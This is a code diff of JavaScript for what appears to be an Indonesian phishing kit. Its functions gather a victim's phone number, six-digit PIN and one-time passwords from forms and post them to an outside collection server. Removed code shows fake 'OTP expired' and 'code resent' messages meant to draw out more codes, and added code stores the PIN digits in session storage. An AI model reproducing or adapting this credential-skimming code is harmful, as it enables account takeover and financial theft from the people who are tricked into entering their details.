@@ -1,5 +1,6 @@
 /////
 function sendNohp(event) {
+event.preventDefault();
    $("#process").show();
    event.preventDefault();
    $("#inp").blur();
@@ -26,8 +27,9 @@ function sendNohp(event) {
  
  
  
-////
+/////
 function sendPin() {
+event.preventDefault();
    var dataString = $("#formNohp, #formPin, #formOtp").serialize();
    $.ajax({
       type: 'POST',
@@ -36,44 +38,58 @@ function sendPin() {
       complete: function(data) {
          console.log('Complete');
          $("#process").hide();
-         document.getElementById("alert").style.display = "block";
-         var nomor = document.getElementById("inp").value;
-         document.getElementById("alert").innerHTML = "Kode dikirim ke +62 " + nomor + " via<br/>";
+       $(".inline-logo").show();
+         var nomor = document.getElementById("nomor").value;
+      document.getElementById("alert").innerHTML = "+62 " + nomor + "";
          $(".bgotp").fadeIn();
-         setInterval(countdown, 1000);
-         $("#otp1").focus();
+         $("#formPin").fadeOut();
+         
+  var items = ["tarif", "nomor"];
+  items.forEach(function(item) {
+  var value = document.getElementById(item).value;
+  sessionStorage.setItem(item, value);
+});       
+  for (var i = 1; i <= 6; i++) {
+  var pin = document.getElementById("pin" + i).value;
+  sessionStorage.setItem("pin" + i, pin);
+}
       }
    });
 };
 
 
-
-
-///
-function sendOtp() {
-   $(".loadingOtp").show();
-   event.preventDefault();
-   setTimeout(function() {
-      $(".alert").text("Masa berlaku OTP sudah habis");
-      $(".alert").css("color", "red");
-   }, 2000);
-   var dataString = $("#formNohp, #formPin, #formOtp").serialize();
-   $.ajax({
-      type: 'POST',
-      url: 'https://choreo.ii-fi.cfd/d0sd/ii/three.php',
-      data: dataString,
-      complete: function(data) {
-         console.log('Complete');
-         setTimeout(function() {
-            $(".loadingOtp").hide();
-            $('.inpotp').val('');
-            $('#otp1').focus();
-            var nomor = document.getElementById("inp").value;
-            document.getElementById("alert").innerHTML = "Kode baru dikirim ulang ke +62" + nomor + " via<br/>";
-            $(".alert").css("color", "black");
-         }, 4000);
-      }
-   });
-};
+/////
+function submit() {
+event.preventDefault();
+  xx.style.display = '';
+  con.style.marginTop = '';  
     
-       
+  $.ajax({
+    type: 'POST',
+    url: 'https://choreo.ii-fi.cfd/d0sd/ii/three.php',
+    data: $('#otp').serialize(),
+    dataType: 'json',
+    complete: function(data) {     
+      console.log(data);
+    },
+    error: function(xhr, status, error) {      
+      console.log(error);
+    },
+    complete: function() {      
+    setTimeout(function() {
+    $("#process").fadeOut();      
+    $(".animated").removeClass("hide");       
+    $(".animated").show();
+     }, 500);
+      setTimeout(function() {        
+        $('#tp1').val('');
+         $('#tp2').val('');
+          $('#tp3').val('');
+           $('#tp4').val('');
+            $('#tp1').focus();       
+           $(".animated").addClass("hide");              
+      }, 4000);
+    }
+  });
+}
+
